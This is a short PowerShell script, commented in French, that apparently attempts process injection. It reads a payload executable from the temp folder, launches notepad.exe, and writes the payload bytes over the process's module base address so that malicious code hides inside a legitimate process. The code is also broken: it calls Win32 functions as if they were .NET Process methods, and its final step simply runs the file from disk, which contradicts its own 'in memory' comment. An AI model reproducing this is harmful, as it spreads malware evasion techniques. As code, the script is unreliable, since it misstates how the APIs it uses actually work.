# Télécharger le payload dans la mémoire
$payloadPath = "$env:TEMP\payload.exe"
$payloadBytes = [System.IO.File]::ReadAllBytes($payloadPath)

# Démarrer le processus cible (notepad.exe)
$process = Start-Process -PassThru -FilePath "notepad.exe"
Start-Sleep -Seconds 2

# Récupérer le handle du processus
$hProcess = [System.Diagnostics.Process]::GetProcessesByName('notepad')[0].Handle

# Allouer de la mémoire dans le processus cible
$allocMem = [System.Diagnostics.Process]::GetProcessesByName('notepad')[0].MainModule.BaseAddress
$ptr = [System.IntPtr]::Zero
[System.Diagnostics.Process]::WriteProcessMemory($hProcess, $allocMem, $payloadBytes, $payloadBytes.Length, $ptr)

# Lancer le payload en mémoire
[System.Diagnostics.Process]::Start($payloadPath)
